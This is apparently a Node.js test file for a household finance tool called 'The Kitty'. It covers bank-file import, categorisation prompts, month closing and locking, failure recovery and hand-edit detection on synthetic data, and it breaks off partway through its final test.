/* The household runtime. Every store, every verb, and what a person reads. `node --test src/household/test.js`, after `node standard/world/build.js`. */
"use strict";
const test = require("node:test"), assert = require("node:assert");
const fs = require("fs"), os = require("os"), path = require("path"), vm = require("vm"), zlib = require("zlib");
const { execFileSync, spawnSync } = require("child_process");
const K = require("./node.js");
const { inflate } = require("./inflate");
const { addDays } = require("../../standard/engine/util");

const root = path.join(__dirname, "..", ".."), WORLD = path.join(root, "standard", ".build", "world");
const enc = (s) => new TextEncoder().encode(s);
const HEAD = "Bank Account,Date,Narrative,Debit Amount,Credit Amount,Balance,Categories,Serial\n";
const ACCOUNT = "733-123 456789";
const dmy = (d) => `${d.slice(8, 10)}/${d.slice(5, 7)}/${d.slice(0, 4)}`;
// A bank export, in the shape Westpaw hands over. rows: [date, narrative, cents], money in positive. It carries the running balance a real one does.
function bankFile(rows, opening = 100000, account = ACCOUNT) {
  let bal = opening;
  const body = rows.map(([d, text, c]) => { bal += c; return `${account},${dmy(d)},${text},${c < 0 ? (-c / 100).toFixed(2) : ""},${c > 0 ? (c / 100).toFixed(2) : ""},${(bal / 100).toFixed(2)},OTHER,`; }).join("\n");
  return { name: "Data.csv", bytes: enc(`${HEAD}${body}\n`), closing: bal };
}
const JULY = [["2026-07-01", "SALARY ACME PTY LTD", 300000], ["2026-07-02", "RENT TO AGENT", -120000], ["2026-07-03", "WOOLWORTHS 1234 CARLTON", -8050], ["2026-07-15", "SOMETHING ODD", -1900], ["2026-08-03", "WOOLWORTHS 1234 CARLTON", -5050]];
const TODAY = "2026-08-05";
const folderOf = () => K.folderStore({ dir: "/kitty", fs: K.memfs() });
const stores = { folder: folderOf, fake: () => K.fakeStore() };
const renter = async (make, today = TODAY) => { const s = make(); await K.init(s, { name: "Sam", people: ["Sam"], today }); return s; };
const count = async (s, t) => (await s.tables.read(t)).length;
const money = async (s) => { const o = {}; for (const t of ["source", "observation", "account", "alias", "stream", "ownership", "x_delivery", "decision", "rule"]) o[t] = await count(s, t); return o; };
const say = async (s, today = TODAY) => (await K.next(s, { today })).say;

for (const [kind, make] of Object.entries(stores)) {
  test(`one renter, one account, on a ${kind} store: blank to a locked month, in the words a person reads`, async () => {
    const s = make();
    assert.equal(await say(s), "Start your Kitty.");
    const made = await K.init(s, { name: "Sam", people: ["Sam"], today: TODAY });
    assert.equal(made.household_id, "H-SAM");
    assert.equal(await say(s), "Add your first bank file.");
    const blank = await K.status(s, { today: TODAY });
    assert.deepEqual(blank.words.slice(0, 1), ["Sam. No files yet."]);
    assert.equal(blank.readiness.accounts_known, 0);
    assert.equal(blank.readiness.scope.not_asked.length, 8);

    const r = await K.add(s, [bankFile(JULY)], { today: TODAY });
    assert.equal(r.added[0].observations, 6);
    assert.deepEqual(r.accounts_created, [{ account_id: "ACC-6789", name: "Account ending 6789", type: "transaction" }]);

    const st = await K.status(s, { today: TODAY }), f = st.readiness;
    assert.equal(f.accounts_known, 1);
    assert.equal(f.net_worth.cents, 265000);
    assert.equal(f.net_worth.of_accounts, 1);
    assert.equal(f.cash.income_cents, 300000);
    assert.equal(f.cash.spending_cents, 129950);
    assert.equal(f.review.uncategorised, 2);
    assert.equal(f.laws.fail, 0);
    assert.deepEqual(st.words.slice(0, 3), ["Sam. Your files reach 3 August 2026.", "$2,650.00 across the 1 account we know about.", "July 2026: $3,000.00 in, $1,299.50 out, $1,219.00 of it not placed yet."]);

    const q1 = await K.next(s, { today: TODAY });
    assert.equal(q1.say, 'What was the $1,200.00 that left on 2 July, marked "RENT TO AGENT"?');
    assert.equal(q1.why, "It is the biggest of the 2 lines we can't place. Answer it once and it is remembered.");
    assert.ok(q1.action.choices.some((c) => c.id === "RENT-PAID" && c.name === "Rent paid"));
    await K.decide(s, { item: q1.action.args.item, category_id: "RENT-PAID", always: true }, { today: TODAY });
    const q2 = await K.next(s, { today: TODAY });
    assert.equal(q2.say, 'What was the $19.00 that left on 15 July, marked "SOMETHING ODD"?');
    assert.equal(q2.why, "It is the last line we can't place.");
    await K.decide(s, { item: q2.action.args.item, category_id: "SHOPPING" }, { today: TODAY });

    assert.equal(await say(s), "Do you keep your payslips?", "asked before a close, so a month locks the first time");
    await K.decide(s, { scope: { domain: "payroll", state: "has" } }, { today: TODAY });

    const c1 = await K.next(s, { today: TODAY });
    assert.equal(c1.say, "Close July 2026.");
    assert.deepEqual(c1.action, { verb: "close", label: "Close July", args: { month: "2026-07" } });
    const closed = await K.close(s, "2026-07", { today: TODAY });
    assert.equal(closed.status, "closed", "she says payslips are coming, so her pay is not proved yet");
    assert.equal(closed.say, "July 2026 is closed but not locked: a pay is waiting on its payslip. Close it again once that is done.");
    assert.ok(closed.written.posting > 0);
    assert.ok((await s.tables.read("posting")).length > 0, "the managed tabs are written at close");

    await K.decide(s, { scope: { domain: "payroll", state: "none" } }, { today: TODAY });
    assert.equal(await say(s), "Lock July 2026.", "she changed her mind, and the month can lock");
    const locked = await K.close(s, "2026-07", { today: TODAY });
    assert.equal(locked.status, "locked");
    assert.equal(locked.say, "July 2026 is locked.");
    assert.equal((await K.close(s, "2026-07", { today: TODAY })).status, "already");
    assert.equal(await say(s), "Do you have a credit card?");
    assert.equal(await say(s, "2026-09-02"), "Your file for Account ending 6789 stops on 3 August.", "a month has passed, and the clock says so");
    assert.equal((await K.status(s, { today: TODAY })).readiness.months_locked, 1);
    const L = (await K.rebuildAt(s, { today: TODAY })).L;
    assert.deepEqual(L.checks.filter((x) => x.law === "L12").map((x) => x.status), ["pass"]);
  });
}

for (const [kind, make] of Object.entries(stores)) {
  test(`shared data on a blank ${kind} store: interest and rent reach their labels, read through, with nothing copied in`, async () => {
    const s = await renter(make, "2026-09-01");
    await K.add(s, [bankFile([["2026-07-01", "CREDIT INTEREST", 1234], ["2026-07-05", "RENT FROM TENANT", 50000], ["2026-08-02", "CREDIT INTEREST", 321], ["2026-08-03", "WOOLWORTHS 1 CARLTON", -555]])], { today: "2026-09-01" });
    await K.decide(s, { target_ref: "ACC-6789|2026-07-05|50000|1", verb: "categorise", value: { category_id: "RENT-INC" } }, { today: "2026-09-01" });
    const held = async () => [await count(s, "category"), await count(s, "tax_map"), await count(s, "recipe")];
    const label = (L, id) => (L.tax.items.find((i) => i.party_id === "SAM" && i.fy === "FY2027" && i.label === id) || {}).amount_cents;
    const { L, view } = await K.rebuildAt(s, { today: "2026-09-01" });
    assert.equal(label(L, "10"), 1555, "interest, on label 10, from the shared tax map");
    assert.equal(label(L, "21P"), 50000, "rent, on label 21P, from the shared tax map");
    assert.ok(L.events.some((e) => e.category_id === "GROCERIES"), "the shared dictionary and chart of categories");
    assert.equal(view.setup.category.length, 57);
    assert.equal(view.setup.tax_map.length, 13);
    assert.deepEqual(await held(), [0, 0, 0], "and none of it is a household row, so an update reaches this household on open");

    // An update to the shared map reaches a household holding no copy of it.
    const shared = K.base().defaults.tax_map, was = [...shared];
    shared.push({ selector_type: "category", selector: "GROCERIES", label: "D5", treatment: "deduction", basis: "person", valid_from: "2018-07-01" });
    try { assert.equal(label((await K.rebuildAt(s, { today: "2026-09-01" })).L, "D5"), 555, "the next open reads the new map"); }
    finally { shared.splice(0, shared.length, ...was); }

    // A household's own row wins, for that selector only. The rest stay shared.
    await K.record(s, "tax_map", [{ selector_type: "category", selector: "INTEREST", label: "24", treatment: "income", basis: "ownership", valid_from: "2018-07-01" }], { today: "2026-09-01" });
    await K.record(s, "category", [{ category_id: "GROCERIES", name: "Food", kind: "expense", cash_lens: true, economic_lens: true }]);
    const mine = await K.rebuildAt(s, { today: "2026-09-01" });
    assert.equal(label(mine.L, "10"), undefined);
    assert.equal(label(mine.L, "24"), 1555);
    assert.equal(label(mine.L, "21P"), 50000);
    assert.equal(mine.view.setup.tax_map.length, 13, "replaced, not added to");
    assert.equal(mine.view.setup.category.length, 57);
    assert.equal(mine.view.setup.category.find((c) => c.category_id === "GROCERIES").name, "Food");
    assert.deepEqual(await held(), [1, 1, 0]);
  });
}

test("every answer ends: after the last question the step is that you are up to date", async () => {
  const s = await renter(stores.folder);
  await K.add(s, [bankFile([["2026-07-01", "WOOLWORTHS 1 CARLTON", -1000]])], { today: "2026-07-02" });
  for (const d of ["credit_card", "super", "home_loan", "rental", "shares", "help_debt", "insurance", "crypto"]) await K.decide(s, { scope: { domain: d, state: "none" } }, { today: "2026-07-02" });
  const n = await K.next(s, { today: "2026-07-02" });
  assert.equal(n.say, "You're up to date.");
  assert.equal(n.why, "Everything we expected is here and July is still running. That means your files are in, not that every number is right.");
  assert.match((await K.status(s, { today: "2026-07-02" })).words.pop(), /^The Kitty is experimental\. It can read a household wrong without saying so/);
});

test("nothing a person reads calls the engine finished: blind families still find it silently wrong", () => {
  const code = (f) => fs.readFileSync(path.join(__dirname, f), "utf8").replace(/\/\*[\s\S]*?\*\/|^\s*\/\/.*$/gm, "");
  const claims = /\b(proved|proven|proof|verified|guarantee[sd]?|accurate|exact|correct|finished|complete|perfect|always right|to the cent)\b/i;
  for (const f of ["next.js", "words.js"]) for (const m of code(f).matchAll(/(?:say|why|label|asks):\s*(["`])((?:\\.|(?!\1).)*)\1/g)) assert.ok(!claims.test(m[2]), `${f}: ${m[2]}`);
  for (const m of code("status.js").matchAll(/(?:asks|why):\s*"([^"]*)"/g)) assert.ok(!claims.test(m[1]), m[1]);
  const skill = fs.readFileSync(path.join(root, "skills", "kitty", "SKILL.md"), "utf8");
  assert.match(skill, /silently wrong/);
  assert.match(skill, /standard\/eval\/SCOREBOARD\.md/);
});

test("a rule learned from money going out says nothing about the refund", async () => {
  const s = await renter(stores.folder);
  await K.add(s, [bankFile([["2026-07-02", "CARLTON CYCLES", -14000], ["2026-07-20", "CARLTON CYCLES", -14000], ["2026-07-28", "CARLTON CYCLES", 14000]])], { today: "2026-08-02" });
  const out = (await K.rebuildAt(s, { today: "2026-08-02" })).L.review.find((r) => r.amount_cents < 0);
  await K.decide(s, { item: out.item_id, category_id: "SHOPPING", always: true }, { today: "2026-08-02" });
  assert.equal((await s.tables.read("rule"))[0].direction, "debit");
  const { L } = await K.rebuildAt(s, { today: "2026-08-02" });
  const back = L.events.find((e) => e.amount_cents === 14000 && e.occurred_on === "2026-07-28");
  assert.notEqual(back.kind, "income", "money back from a shop is not income");
  assert.equal(L.cash.find((m) => m.month === "2026-07").income, 0);
});

test("money nobody has explained is said out loud, apart from income and spending", async () => {
  const s = await renter(stores.folder);
  await K.add(s, [bankFile([["2026-07-02", "A DEPOSIT FROM NOWHERE", 50000], ["2026-07-30", "WOOLWORTHS 1 CARLTON", -1000]])], { today: "2026-08-02" });
  const st = await K.status(s, { today: "2026-08-02" });
  assert.equal(st.readiness.cash.income_cents, 0);
  assert.equal(st.readiness.cash.unexplained_cents, 50000);
  assert.equal(st.words[2], "July 2026: $0.00 in, $10.00 out, and $500.00 came in that nobody has explained.");
});

test("a family with a mortgage reads the same steps: two people, a loan, a missing month", async () => {
  const s = stores.fake(), today = "2026-04-10";
  await K.init(s, { name: "The Parks", people: ["Ana Park", "Ben Park"], today });
  const line = (d, c) => [d, "WOOLWORTHS 1 CARLTON", c];
  const r = await K.add(s, [bankFile([line("2026-01-02", -5000), line("2026-01-30", -6000)], 900000, "111-222 333444")], { today: "2026-02-03", name: "Joint" });
  assert.equal(r.accounts_created[0].name, "Joint");
  await K.add(s, [bankFile([line("2026-03-02", -7000), line("2026-03-30", -7000)], 884000, "111-222 333444")], { today: "2026-04-03" });
  const own = await s.tables.read("ownership");
  assert.deepEqual(own.filter((o) => o.basis === "legal").map((o) => [o.party_id, o.share_bps]), [["ANA-PARK", 5000], ["BEN-PARK", 5000]]);
  const first = await K.status(s, { today });
  assert.equal(first.words[1], "$8,750.00 across the 1 account we know about.", "statements older than the household still count");
  assert.deepEqual(first.readiness.coverage.streams[0].missing, ["2026-02"]);
  assert.equal(await say(s, today), "Bring in February 2026 for Joint.");
  await K.record(s, "account", [{ account_id: "LOAN", name: "Home loan", class: "liability", type: "loan", reporting_group: "loans", currency: "AUD", fidelity: "ledger", in_scope: true }], { today });
  await K.add(s, [bankFile([line("2026-02-10", -5000)], 889000, "111-222 333444")], { today });
  for (const m of ["January 2026", "February 2026", "March 2026"]) { const n = await K.next(s, { today }); assert.equal(n.say, `Close ${m}.`); assert.equal((await K.close(s, n.action.args.month, { today })).status, "locked"); }
  assert.equal((await K.status(s, { today })).readiness.accounts_known, 2);
  assert.equal(await say(s, today), "Do you have a credit card?");
  await K.decide(s, { scope: { domain: "credit_card", state: "has" } }, { today });
  assert.equal(await say(s, today), "Do you have super?");
  await K.decide(s, { scope: { domain: "super", state: "has" } }, { today });
  assert.equal(await say(s, today), "Do you own a property you rent out?", "a home loan is not asked about: one is here");
});

test("a quota failure part way through an append leaves the store recoverable, and running it again does not double", async () => {
  const rows = Array.from({ length: 2300 }, (_, i) => [addDays("2026-01-01", Math.floor(i / 16)), `SHOP NUMBER ${i}`, -100]);
  const file = bankFile(rows, 500000);
  const s = await renter(stores.fake, "2026-08-01");
  // The second chunk of observations dies on quota: the first is in the sheet, and the file's source row is not.
  const counter = { n: 0 }, real = s.fake.callTool;
  s.fake.callTool = async (server, tool, input, o) => { if (tool === "update_values" && /Observation/.test(input.range) && ++counter.n === 2) throw { code: "rate_limited", message: "429: Quota exceeded" }; return real(server, tool, input, o); };
  await assert.rejects(K.add(s, [file], { today: "2026-08-01" }), (e) => e.code === "rate_limited");
  assert.equal(await count(s, "observation"), 2000, "the first chunk landed");
  assert.equal(await count(s, "source"), 0, "the commit did not");
  const middle = await K.rebuildAt(s, { today: "2026-08-01" });
  assert.equal(middle.L.events.length, 0, "half a file is read by nobody");
  assert.equal((await K.status(s, { today: "2026-08-01" })).readiness.sources.held, 0);
  s.fake.callTool = real;
  const r = await K.add(s, [file], { today: "2026-08-01" });
  assert.equal(r.added[0].observations, 2301);
  assert.equal(await count(s, "observation"), 2301, "not one row doubled");
  assert.equal(await count(s, "source"), 1);
  const clean = await renter(stores.fake, "2026-08-01");
  await K.add(clean, [file], { today: "2026-08-01" });
  assert.equal((await K.rebuildAt(s, { today: "2026-08-01" })).L.bundleHash, (await K.rebuildAt(clean, { today: "2026-08-01" })).L.bundleHash);
});

test("Google did the work and the answer was lost: the row is not written twice", async () => {
  const s = await renter(stores.fake);
  s.fake.failOn({ tool: "update_values", range: "Source", applied: true });
  await assert.rejects(K.add(s, [bankFile(JULY)], { today: TODAY }), (e) => e.code === "rate_limited");
  const before = await money(s);
  const r = await K.add(s, [bankFile(JULY)], { today: TODAY });
  assert.deepEqual(await money(s), before);
  assert.equal(r.added.length + r.already.length, 1);
});

for (const [kind, make] of Object.entries(stores)) {
  test(`adding the same file twice adds nothing, on a ${kind} store`, async () => {
    const s = await renter(make);
    await K.add(s, [bankFile(JULY)], { today: TODAY });
    const before = await money(s), r = await K.add(s, [bankFile(JULY)], { today: TODAY });
    assert.deepEqual(r.already.map((a) => a.name), ["Data.csv"]);
    assert.equal(r.added.length, 0);
    assert.deepEqual(await money(s), before);
    await K.add(s, [bankFile(JULY)], { today: "2026-09-01" });
    assert.deepEqual(await money(s), before, "a busy file added again later is still only the same file");
    await K.add(s, [bankFile(JULY), bankFile(JULY)], { today: "2026-09-02" });
    assert.deepEqual(await money(s), before);
  });
}

test("a dormant account's empty export arrives again next month: a delivery, not a file, and it answers for that month", async () => {
  const s = await renter(stores.folder);
  const quiet = { name: "Data.csv", bytes: enc(HEAD) };
  await K.record(s, "account", [{ account_id: "SAVE", name: "Rainy day", class: "asset", type: "savings", reporting_group: "cash", currency: "AUD", fidelity: "ledger", in_scope: true }]);
  await K.record(s, "stream", [{ stream_id: "SAVE", name: "Rainy day", doc_kind: "statement", subject_type: "account", subject_id: "SAVE", cadence: "monthly", valid_from: "2026-05-01", recorded_at: "2026-05-01T00:00:00Z" }]);
  const stamped = (day) => ({ ...quiet, stream: "SAVE", download_date: day });
  await K.add(s, [stamped("2026-06-02")], { today: "2026-06-02" });
  await K.add(s, [stamped("2026-07-02")], { today: "2026-07-02" });
  await K.add(s, [stamped("2026-07-02")], { today: "2026-07-02" });
  await K.add(s, [stamped("2026-08-02")], { today: "2026-08-02" });
  assert.equal(await count(s, "source"), 1);
  assert.deepEqual((await s.tables.read("x_delivery")).map((d) => d.day), ["2026-07-02", "2026-08-02"]);
});

test("nothing unread is dropped: a format with no recipe is held, asked about, read after the gate passes it, and a wrong recipe is refused", async () => {
  const s = await renter(stores.folder);
  const odd = { name: "export.csv", bytes: enc("When,What,Change,Left\n01/07/2026,COFFEE,-4.50,95.50\n13/07/2026,LUNCH,-15.50,80.00\n20/07/2026,REFUND,5.00,85.00\n") };
  const r = await K.add(s, [odd], { today: TODAY });
  assert.equal(r.added.length, 0);
  const ask = r.needs_recipe[0];
  assert.match(ask.ask, /^export\.csv is a csv file The Kitty has not met\. Nothing from it is in your numbers yet\./);
  assert.deepEqual(ask.sample.rows[1], ["01/07/2026", "COFFEE", "-4.50", "95.50"]);
  assert.match(ask.fingerprint, /^fp1:/);
  assert.equal(await count(s, "source"), 1, "the file is held");
  assert.equal(await say(s), "We can't read export.csv yet.");
  assert.equal((await K.status(s, { today: TODAY })).readiness.sources.unread, 1);

  const recipe = { id: "odd-bank-csv", version: 1, tier: "table", container: "csv", fingerprints: [ask.fingerprint], defaults: { date: "dmy", currency: "AUD" }, table: { header: 1, order: "oldest_first" },
    emit: [{ kind: "txn_line", fields: { account_ref: { const: "ODD-1234" }, posting_date: { col: "When", as: "date" }, description: { col: "What" }, amount_cents: { col: "Change", as: "cents" }, balance_after_cents: { col: "Left", as: "cents" } } }],
    statement: { from: "chain" }, controls: [{ law: "balance_chain" }] };
  const wrong = await K.addRecipe(s, { ...recipe, id: "wrong", emit: [{ kind: "txn_line", fields: { ...recipe.emit[0].fields, amount_cents: { col: "Change", as: "cents", negate: true } } }] }, { today: TODAY });
  assert.equal(wrong.status, "failed", "money that does not conserve is refused, whoever wrote the recipe");
  assert.equal(await count(s, "recipe"), 0);
  assert.equal(await count(s, "observation"), 0);
  const right = await K.addRecipe(s, recipe, { today: TODAY, author: "agent" });
  assert.equal(right.status, "passed");
  assert.equal(right.read.added[0].observations, 4);
  assert.equal((await s.tables.read("recipe"))[0].gate_status, "passed");
  assert.equal((await K.status(s, { today: TODAY })).readiness.sources.unread, 0);
  const again = await K.add(s, [odd], { today: TODAY });
  assert.equal(again.already.length, 1, "the file is read now, so adding it again is nothing");
  assert.equal((await K.rebuildAt(s, { today: TODAY })).L.lines.length, 3);
});

test("a file that fails its own checks is refused whole, says so, and the next step says it", async () => {
  const s = await renter(stores.folder);
  const bad = enc(`${HEAD}${ACCOUNT},01/07/2026,COFFEE,4.50,,95.50,,\n${ACCOUNT},02/07/2026,LUNCH,10.00,,50.00,,\n${ACCOUNT},03/07/2026,TEA,1.00,,49.00,,\n`);
  const r = await K.add(s, [{ name: "bad.csv", bytes: bad }], { today: TODAY });
  assert.equal(r.refused.length, 1);
  assert.equal(await count(s, "observation"), 0);
  assert.equal(await say(s), "bad.csv failed its checks, so none of it is in your numbers.");
  assert.deepEqual((await K.rebuildAt(s, { today: TODAY })).L.review.map((x) => x.kind), ["file_refused"]);
});

test("a scan is held and asked about, and waits behind money", async () => {
  const s = await renter(stores.folder);
  const png = new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0, 0, 0, 13]);
  const r = await K.add(s, [{ name: "receipt.png", bytes: png }, bankFile([["2026-07-02", "SOMETHING ODD", -1900]])], { today: TODAY });
  assert.match(r.needs_agent[0].ask, /^receipt\.png is an image with no text layer/);
  assert.equal(await say(s), 'What was the $19.00 that left on 2 July, marked "SOMETHING ODD"?');
});

test("next never says you are up to date over a question it has not asked", async () => {
  const s = await renter(stores.folder);
  await K.add(s, [bankFile([["2026-07-01", "WOOLWORTHS 1 CARLTON", -1000]])], { today: "2026-07-02" });
  for (const d of ["credit_card", "super", "home_loan", "rental", "shares", "help_debt", "insurance", "crypto"]) await K.decide(s, { scope: { domain: d, state: "none" } }, { today: "2026-07-02" });
  const built = await K.rebuildAt(s, { today: "2026-07-02" });
  built.L.review.push({ item_id: "rv_x", kind: "possible_duplicate", ref: "x", what: "These two charges look like one.", do: "Say whether they are." });
  const n = K.pick(built);
  assert.equal(n.say, "These two charges look like one.");
  assert.equal(n.why, "Say whether they are.");
  built.L.review.length = 0;
  built.L.review.push({ item_id: "rv_y", kind: "unresolved_account", ref: "o1", what: "No account for 123 on 2026-07-02." });
  assert.equal(K.pick(built).say, "No account for 123 on 2026-07-02.");
});

test("a broker's holdings from nobody we know: reported by add, asked about by next, and not lost", async () => {
  const s = await renter(stores.folder);
  await K.add(s, [bankFile(JULY)], { today: TODAY });
  const { sha256 } = require("../../standard/intake/sha256"), sha = sha256(enc("h"));
  await s.tables.appendNew("observation", [{ obs_id: "obs-h", source_id: "src-h", locator: "line 1", kind: "super_line", occurred_on: "2026-07-05", payload: { account_ref: "FUND-9", posting_date: "2026-07-05", line_type: "contribution", description: "SG", amount_cents: 100 }, importer: "agent", confidence: "0.9", status: "active" }]);
  await s.tables.appendNew("source", [{ source_id: "src-h", sha256: sha, name: "fund.pdf", origin: "manual", captured_at: `${TODAY}T00:00:00Z`, status: "active" }]);
  const n = await K.next(s, { today: TODAY });
  assert.equal(n.id, "unresolved_account");
  assert.equal(n.say, "No account for FUND-9.");
});

test("a hand edit in a managed tab stops the write, reports it, and the person decides", async () => {
  const s = await renter(stores.fake);
  await K.add(s, [bankFile(JULY)], { today: TODAY });
  await K.decide(s, { item: (await K.next(s, { today: TODAY })).action.args.item, category_id: "RENT-PAID" }, { today: TODAY });
  await K.decide(s, { item: (await K.next(s, { today: TODAY })).action.args.item, category_id: "SHOPPING" }, { today: TODAY });
  await K.close(s, "2026-07", { today: TODAY });
  const clean = JSON.stringify(s.fake.sheet.sheet("Posting").rows);
  s.handEdit("Posting", 2, 3, "ACC-TYPED");
  const typed = JSON.stringify(s.fake.sheet.sheet("Posting").rows), periods = await count(s, "period");

  const writes = s.fake.log.length;
  const stopped = await K.close(s, "2026-07", { today: TODAY });
  assert.equal(stopped.status, "stopped");
  assert.equal(stopped.edits[0].tab, "Posting");
  assert.equal(stopped.say, "Someone typed in the Posting tab. Nothing was written. Say what was meant, then close again.");
  assert.equal(JSON.stringify(s.fake.sheet.sheet("Posting").rows), typed, "the typing survives");
  assert.equal(await count(s, "period"), periods);
  assert.ok(!s.fake.log.slice(writes).some((c) => c.tool === "batch_clear_values"), "no managed tab was touched");
  const proposed = (await s.tables.read("decision")).filter((d) => d.status === "proposed");
  assert.equal(proposed.length, 1);
  assert.equal(proposed[0].target_ref, "posting");
  assert.equal(await say(s), "Someone typed in the Posting tab.");

  await K.close(s, "2026-07", { today: TODAY });
  assert.equal((await s.tables.read("decision")).filter((d) => d.status === "proposed").length, 1, "asking twice asks once");
  await K.decide(s, { hand_edit: { table: "posting" }, reason: "A slip. Rebuild it." }, { today: TODAY });
  assert.equal((await K.close(s, "2026-07", { today: TODAY })).status, "closed");
  assert.equal(JSON.stringify(s.fake.sheet.sheet("Posting").rows), clean, "and the tab is the engine's again");
  assert.notEqual(await say(s), "Someone typed in the Posting tab.");
});

test("typing in a Folder store's managed file stops the close the same way", async () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "kitty-edit-")), s = K.folder(dir);
  await K.init(s, { name: "Sam", people: ["Sam"], today: TODAY });
  await K.add(s, [bankFile(JULY)], { today: TODAY });
  await K.close(s, "2026-07", { today: TODAY });
  const file = path.join(dir, "posting.jsonl");
  fs.writeFileSync(file, fs.readFileSync(file, "utf8").replace(/"amount_cents":-?\d+/, '"amount_cents":1'));
  const edited = fs.readFileSync(file, "utf8"), r = await K.close(s, "2026-07", { today: TODAY });
  assert.equal(r.status, "stopped");
  assert.equal(fs.readFileSync(file, "utf8"), edited);
  fs.rmSync(dir, { recursive: true });
});

test("a close cut off in the middle is finished by running it again, and is not mistaken for typing", async () => {
  const s = await renter(stores.fake);
  await K.add(s, [bankFile(JULY)], { today: TODAY });
  s.fake.failOn({ tool: "update_values", range: "Posting" });
  await assert.rejects(K.close(s, "2026-07", { today: TODAY }), (e) => e.code === "rate_limited");
  assert.equal(await count(s, "period"), 0, "the seal goes on last");
  const m = await s.manifest();
  assert.ok(m.tables.posting.writing, "the manifest knows a write was under way");
  assert.equal((await K.close(s, "2026-07", { today: TODAY })).status, "closed");
  assert.ok(!(await s.manifest()).tables.posting.writing);
});

test("close is earned: a running month, a file that stops short, an account with no stated balance", async () => {
  const s = await renter(stores.folder);
  await K.add(s, [bankFile([["2026-07-01", "WOOLWORTHS 1 CARLTON", -1000], ["2026-07-10", "WOOLWORTHS 1 CARLTON", -1000]])], { today: "2026-07-12" });
  assert.deepEqual(await K.close(s, "2026-07", { today: "2026-07-12" }), { status: "refused", month: "2026-07", say: "July 2026 is not over yet." });
  assert.equal((await K.close(s, "2026-07", { today: "2026-08-20" })).say, "The file for Account ending 6789 stops before the end of July 2026.");
  assert.equal((await K.close(s, "2026-02", { today: "2026-08-20" })).say, "There are no lines in February 2026 to close.");
});

test("balances that contradict each other do not close", async () => {
  const s = await renter(stores.folder);
  await K.add(s, [bankFile([["2026-07-01", "WOOLWORTHS 1 CARLTON", -1000], ["2026-07-30", "WOOLWORTHS 1 CARLTON", -1000]], 100000)], { today: "2026-08-02" });
  await K.add(s, [bankFile([["2026-08-01", "WOOLWORTHS 1 CARLTON", -1000], ["2026-08-30", "WOOLWORTHS 1 CARLTON", -1000]], 50000)], { today: "2026-09-02" });
  const { L } = await K.rebuildAt(s, { today: "2026-09-02" });
  assert.ok(L.checks.some((c) => c.law === "L3" && c.status === "fail"), JSON.stringify(L.checks.filter((c) => c.law === "L3")));
  assert.equal((await K.close(s, "2026-08", { today: "2026-09-02" })).say, "The balances for Account ending 6789 do not add up, so August 2026 can't close.");
  assert.equal(await say(s, "2026-09-02"), "The balances for Account ending 6789 do not add up.");
});

test("a file with no account in it is held and asks which account it is", async () => {
  const recipe = require("../../standard/recipes/bark-noheader-csv.json");
  const { decode } = require("../../standard/intake/containers"), { fingerprint } = require("../../standard/intake/fingerprint");
  const bytes = enc('20/07/2026,"-5.00","TEA","+65.00"\n14/07/2026,"-20.00","LUNCH","+70.00"\n01/07/2026,"-10.00","COFFEE","+90.00"\n');
  const s = await renter(stores.folder);
  assert.ok(recipe.fingerprints.includes(fingerprint(decode(bytes, {}))), "this is the shape that recipe reads");
  const r = await K.add(s, [{ name: "bark.csv", bytes }], { today: TODAY });
  assert.equal(r.added.length, 0);
  assert.match(r.needs_account[0].ask, /^bark\.csv does not say which account it is for/);
  assert.equal(await count(s, "observation"), 0);
  await K.record(s, "account", [{ account_id: "ACC-1", name: "Everyday", class: "asset", type: "transaction", reporting_group: "cash", currency: "AUD", fidelity: "ledger", in_scope: true }]);
  const again = await K.add(s, [{ name: "bark.csv", bytes }], { today: TODAY, account: "ACC-1" });
  assert.equal(again.added[0].observations, await count(s, "observation"));
  assert.ok(again.added[0].observations > 0);
  assert.deepEqual((await K.rebuildAt(s, { today: TODAY })).L.review.filter((x) => x.kind === "file_refused"), []);
});

test("status refuses a folder with no Kitty in it, in words", async () => {
  await assert.rejects(K.status(stores.folder(), { today: TODAY }), /no Kitty here yet/);
});

test("next says when setting up was cut off", async () => {
  const s = K.fakeStore();
  s.fake.failOn({ tool: "update_values", range: "Party" });
  await assert.rejects(K.init(s, { name: "Sam", people: ["Sam"], today: TODAY }));
  assert.equal(await say(s), "Finish setting up your Kitty.");
});

test("a locked month that changes says so, and reopening is a decision with a reason", async () => {
  const s = await renter(stores.folder);
  await K.add(s, [bankFile([["2026-07-01", "WOOLWORTHS 1 CARLTON", -1000], ["2026-07-31", "WOOLWORTHS 1 CARLTON", -500], ["2026-08-01", "WOOLWORTHS 1 CARLTON", -500]])], { today: "2026-08-02" });
  assert.equal((await K.close(s, "2026-07", { today: "2026-08-02" })).status, "locked");
  await K.decide(s, { target_ref: "ACC-6789|2026-07-31|-500", verb: "categorise", value: { category_id: "SHOPPING" } }, { today: "2026-08-03" });
  const n = await K.next(s, { today: "2026-08-03" });
  assert.equal(n.say, "July 2026 was locked, and something now changes it.");
  await assert.rejects(K.decide(s, { reopen: "2026-07" }, { today: "2026-08-03" }), /needs a reason/);
  await K.decide(s, { reopen: "2026-07", reason: "That was shopping." }, { today: "2026-08-03" });
  assert.deepEqual((await K.rebuildAt(s, { today: "2026-08-03" })).L.checks.filter((c) => c.law === "L12").map((c) => c.status), ["pass"]);
  assert.equal((await K.close(s, "2026-07", { today: "2026-08-03" })).status, "locked");
});

test("today hides a later source, a later decision and later setup, and as_of never passes it", async () => {
  const s = await renter(stores.folder, "2026-01-05");
  await K.add(s, [bankFile([["2026-01-02", "SOMETHING ODD", -1000]], 100000)], { today: "2026-02-01" });
  const item = (await K.next(s, { today: "2026-02-01" })).action.args.item;
  await K.add(s, [bankFile([["2026-02-02", "OTHER THING", -2000]], 99000)], { today: "2026-03-01" });
  await K.decide(s, { item, category_id: "SHOPPING" }, { today: "2026-03-02" });
  await K.add(s, [bankFile([["2026-03-02", "THIRD THING", -500]], 50000, "555-000 998877")], { today: "2026-03-05" });
  await K.decide(s, { scope: { domain: "super", state: "none" } }, { today: "2026-03-06" });

  const then = await K.rebuildAt(s, { today: "2026-02-10" });
  assert.equal(then.L.lines.length, 1, "the March download has not happened yet");
  assert.equal(then.clock.today, "2026-02-10");
  assert.equal(then.clock.as_of, "2026-01-02");
  assert.equal(then.L.review.filter((r) => r.kind === "uncategorised").length, 1, "the answer came later");
  assert.deepEqual(then.view.setup.account.map((a) => a.account_id), ["ACC-6789"], "the second account was not known yet");
